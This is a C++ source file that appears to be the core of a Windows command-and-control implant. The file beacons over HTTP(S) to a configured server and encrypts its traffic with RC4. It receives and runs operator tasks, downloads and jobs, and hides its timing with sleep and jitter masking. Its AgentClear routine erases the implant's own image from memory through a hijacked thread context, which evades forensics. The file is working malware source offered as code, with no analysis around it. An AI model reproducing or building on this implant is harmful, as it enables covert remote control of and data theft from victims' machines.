#include "main.h"
#include "ApiLoader.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"

Agent*         g_Agent;
ConnectorHTTP* g_Connector;

void AgentMain()
{
	if ( !ApiLoad() ) return;

	g_Agent  = (Agent*) MemAllocLocal(sizeof(Agent));
	*g_Agent = Agent();

	CHAR* HttpHeaders = g_Agent->CreateHeaders();

	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
	*g_Connector = ConnectorHTTP();
	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->http_method, (CHAR*)g_Agent->config->servers[0], g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders);

	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
	*packerOut = Packer();
	packerOut->Pack32(0);

	ULONG recvDataSize = 0;
	BYTE* recvData     = NULL;

	do {
		if (packerOut->GetDataSize() > 4) {
			packerOut->Set32(0, packerOut->GetDataSize());
			
			BYTE* data = packerOut->GetData();
			ULONG dataSize = packerOut->GetDataSize();
			EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);

			recvData = g_Connector->SendData( data, dataSize, &recvDataSize);
			
			packerOut->Clear();
			packerOut->Pack32(0);
		}
		else {
			recvData = g_Connector->SendData(NULL, 0, &recvDataSize);
		}

		if (recvData && recvDataSize > g_Agent->config->ans_size) {
			DecryptRC4(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, g_Agent->SessionKey, 16);
			g_Agent->commander->ProcessCommandTasks(recvData + g_Agent->config->ans_pre_size, recvDataSize - g_Agent->config->ans_size, packerOut);
			MemFreeLocal((LPVOID*)&recvData, recvDataSize);
		}
		if (g_Agent->IsActive() && packerOut->GetDataSize() < 8 )
			WaitMask( g_Agent->config->sleep_delay * 1000, g_Agent->config->jitter_delay );

		g_Agent->downloader->ProcessDownloadTasks(packerOut);			
		g_Agent->jober->ProcessJobs(packerOut);

	} while ( g_Agent->IsActive() );

	g_Agent->commander->Exit(packerOut);

	BYTE* data     = packerOut->GetData();
	ULONG dataSize = packerOut->GetDataSize();
	EncryptRC4(data, dataSize, g_Agent->SessionKey, 16);

	g_Connector->SendData(data, dataSize, &recvDataSize);
	AgentClear(g_Agent->config->exit_method);
}

#if defined(_M_X64) || defined(__x86_64__)
#define PTR_TYPE DWORD64
#define CONTEXT_IP(ctx) (ctx).Rip
#define CONTEXT_SP(ctx) (ctx).Rsp
#define CONTEXT_ARG1(ctx) (ctx).Rcx
#define CONTEXT_ARG2(ctx) (ctx).Rdx
#define CONTEXT_ARG3(ctx) (ctx).R8
#define CONTEXT_ARG4(ctx) (ctx).R9
#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS
#else
#define PTR_TYPE DWORD
#define CONTEXT_IP(ctx) (ctx).Eip
#define CONTEXT_SP(ctx) (ctx).Esp
#define CONTEXT_ARG1(ctx) (ctx).Ecx
#define CONTEXT_ARG2(ctx) (ctx).Edx
#define CONTEXT_ARG3(ctx) (ctx).Ebx
#define CONTEXT_ARG4(ctx) (ctx).Esi
#define IMAGE_NT_HEADERS_TYPE PIMAGE_NT_HEADERS32
#endif

void AgentClear(int method)
{
	PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
	PLIST_ENTRY modList = &Peb->Ldr->InLoadOrderModuleList;
	PVOID moduleAddr = ((PLDR_DATA_TABLE_ENTRY)modList->Flink)->DllBase;

	ULONG elfanew = ((PIMAGE_DOS_HEADER)moduleAddr)->e_lfanew;
	DWORD moduleSize = (((IMAGE_NT_HEADERS_TYPE)((PBYTE)moduleAddr + elfanew))->OptionalHeader.SizeOfImage);

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	ApiWin->RtlCaptureContext(&ctx);

	CONTEXT_IP(ctx) = (PTR_TYPE)ApiNt->NtFreeVirtualMemory;
	CONTEXT_SP(ctx) = (PTR_TYPE)((CONTEXT_SP(ctx) & ~(0x1000 - 1)) - 0x1000);
	CONTEXT_ARG1(ctx) = (PTR_TYPE)NtCurrentProcess();
	CONTEXT_ARG2(ctx) = (PTR_TYPE)(&moduleAddr);
	CONTEXT_ARG3(ctx) = (PTR_TYPE)(&moduleSize);
	CONTEXT_ARG4(ctx) = (PTR_TYPE)MEM_RELEASE;

	if (method == 1)
		*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserThread;
	else if (method == 2)
		*(PTR_TYPE volatile*)(CONTEXT_SP(ctx)) = (PTR_TYPE)ApiNt->RtlExitUserProcess;

	ctx.ContextFlags = CONTEXT_FULL;
	ApiNt->NtContinue(&ctx, FALSE);
}